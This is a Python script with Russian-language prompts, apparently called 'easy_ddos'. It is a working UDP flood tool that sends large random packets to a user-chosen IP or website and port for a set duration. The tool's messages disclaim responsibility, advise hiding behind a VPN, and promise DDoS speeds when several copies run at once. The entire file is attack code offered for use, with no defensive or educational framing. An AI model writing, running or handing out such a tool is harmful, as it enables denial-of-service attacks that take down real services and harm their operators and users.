import socket
import random
import time
import colorama

from colorama import Fore, Back, Style

def RUN():
	print(Fore.RED + """
	
	
	███████████████████████████████████████████████████
	█▄─▀█▀─▄█▄─▄▄▀█████▄─█─▄█▄─▄▄▀█▄─▄█─▄─▄─█▄─▄█▄─█─▄█
	██─█▄█─███─▄─▄█░░███─▄▀███─▄─▄██─████─████─███─▄▀██
	▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▀▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▀▀▄▄▄▀▀▄▄▄▀▄▄▀▄▄▀
	
	
	""")

	print(Style.BRIGHT + "Мы не несем ответственности за то, что вы делаете с помощью этого инструмента, используйте его на свой страх и риск.")
	print(Fore.YELLOW + "Ваш ip-адрес по-прежнему виден, убедитесь, что вы подключены к" + Fore.BLUE + " vpn.")
	print(Fore.RED + "Пример: " + Fore.BLUE + "\nip: 123.456.78.90 " + Fore.YELLOW + "Порт: 80 (Default) " + Fore.RED + "Продолжительность: 3600")
	print(Fore.BLUE + "Атака веб сайтов так же поддерживается, " + Fore.YELLOW + "\nпример: ip: example.com")
	print(Fore.RED + "Запуск 1-3 скриптов" + Fore.MAGENTA + " DoS скорость: 15 - 20+ Mbps")
	print(Fore.RED + "Запуск 5-10 скриптов" + Fore.MAGENTA + " DDoS скорость: 250 - 300+ Mbps")
	print(Style.BRIGHT + Fore.RED + "[!] " + Fore.YELLOW + "Чтобы получить эти быстрые скорости DDoS и DOS, обязательно используйте" + Fore.MAGENTA + Style.BRIGHT +  " Несколько запусов" )

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



	bytes = random._urandom(65500)


	ip = input('Цель IP (БЕЗ https/http): ')
	port = int(input(Fore.YELLOW + 'Порт: '))

	duration = input(Fore.GREEN + 'Количество секунд для отправки пакетов: ')
	print(Fore.RED + Style.NORMAL + " ")

	timeout = time.time() + float(duration)

	sent = 0



	while True:
		if time.time() > timeout:
			break
		else:
			pass
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print(Fore.MAGENTA + "[+] " + Fore.RED + "easy_ddos " + Fore.GREEN + "Отправил пакет %s в %s через порт %s"%(sent, ip, port))